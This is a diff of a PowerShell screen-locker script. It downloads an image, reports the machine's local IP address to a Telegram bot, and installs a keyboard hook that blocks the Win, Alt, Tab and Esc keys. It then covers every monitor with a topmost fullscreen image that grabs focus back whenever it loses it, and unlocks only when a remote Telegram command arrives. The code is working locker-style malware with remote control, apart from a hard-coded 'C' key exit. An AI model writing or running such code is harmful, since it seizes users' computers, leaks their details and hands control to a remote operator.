@@ -10,7 +10,7 @@ $unlockCommand = "/unlock$user"
 # DOWNLOAD IMAGE
 Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
 
-# SEND TELEGRAM MESSAGE
+# SEND TELEGRAM MESSAGE FUNCTION
 function Send-Telegram-Message {
     try {
         $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
@@ -27,7 +27,7 @@ function Send-Telegram-Message {
 
 Send-Telegram-Message
 
-# LOW-LEVEL KEYBOARD HOOK
+# LOW-LEVEL KEYBOARD HOOK CLASS
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -50,13 +50,8 @@ public class KeyBlocker {
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-    public static void Block() {
-        hookId = SetHook(proc);
-    }
-
-    public static void Unblock() {
-        UnhookWindowsHookEx(hookId);
-    }
+    public static void Block() { hookId = SetHook(proc); }
+    public static void Unblock() { UnhookWindowsHookEx(hookId); }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc) {
         using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
@@ -69,9 +64,10 @@ public class KeyBlocker {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
 
-            if (vkCode == 0x43) Environment.Exit(0); // 'C'
-            if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1; // Win keys
-            if (vkCode == 0x09 || vkCode == 0x12 || vkCode == 0x1B) return (IntPtr)1; // Tab, Alt, Esc
+            if (vkCode == 0x43) Environment.Exit(0); // C key closes app
+            if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12) {
+                return (IntPtr)1; // Block TAB, ESC, Win keys, ALT
+            }
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -80,17 +76,19 @@ public class KeyBlocker {
 
 [KeyBlocker]::Block()
 
-# FULLSCREEN IMAGE ALL MONITORS
+# FULLSCREEN ON ALL MONITORS
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
-        WindowState = 'Maximized'
         FormBorderStyle = 'None'
+        WindowState = 'Maximized'
+        StartPosition = 'Manual'
         TopMost = $true
         Location = $screen.Bounds.Location
         Size = $screen.Bounds.Size
-        BackColor = 'Black'
         Cursor = [System.Windows.Forms.Cursors]::None
+        BackColor = 'Black'
     }
 
     $pb = New-Object Windows.Forms.PictureBox -Property @{
@@ -99,31 +97,34 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
         SizeMode = 'StretchImage'
     }
 
-    $form.Controls.Add($pb)
     $form.Add_Deactivate({ $form.Activate() })
+    $form.Controls.Add($pb)
     $form.Show()
     $form
 }
 
-# TELEGRAM LISTENER
-Start-Job {
-    $uri = "https://api.telegram.org/bot$using:botToken/getUpdates"
+# TELEGRAM LISTENER TO UNLOCK
+$job = Start-Job -ScriptBlock {
     $offset = 0
+    $unlock = $using:unlockCommand
     while ($true) {
-        $updates = Invoke-RestMethod "$uri?timeout=20&offset=$offset"
+        $url = "https://api.telegram.org/bot$($using:botToken)/getUpdates?timeout=20&offset=$offset"
+        $updates = Invoke-RestMethod -Uri $url -TimeoutSec 25
         foreach ($update in $updates.result) {
             $offset = $update.update_id + 1
-            if ($update.message.text -eq $using:unlockCommand) {
+            if ($update.message.text -eq $unlock) {
                 [System.Windows.Forms.Application]::Exit()
-                Exit
+                break
             }
         }
         Start-Sleep -Seconds 1
     }
 }
 
-# RUN THE APP
+# START APPLICATION MESSAGE LOOP
 [System.Windows.Forms.Application]::Run()
 
 # CLEANUP ON EXIT
 [KeyBlocker]::Unblock()
+Stop-Job $job | Out-Null
+Remove-Job $job | Out-Null
